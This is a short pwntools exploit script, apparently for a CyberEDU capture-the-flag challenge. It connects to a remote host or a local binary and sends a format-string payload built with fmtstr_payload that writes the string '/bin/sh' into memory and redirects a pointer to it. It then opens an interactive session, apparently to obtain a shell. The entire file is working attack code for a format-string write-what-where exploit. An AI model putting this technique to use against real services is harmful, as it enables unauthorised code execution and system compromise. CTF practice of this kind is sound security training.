from pwn import *
elf = ELF('/home/kali/Downloads/main')

cyberedu = '35.246.235.205:32399'
context.arch = 'amd64'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
 
    
writes = {
   0x404048: 0x404000,
   0x404000: 0x68732f6e69622f
  
}

#can't use this bc nullbyte breaking our payload?? 
#start = 6

payload = fmtstr_payload(6,writes)

print(payload)
p.sendline(payload)


p.interactive()
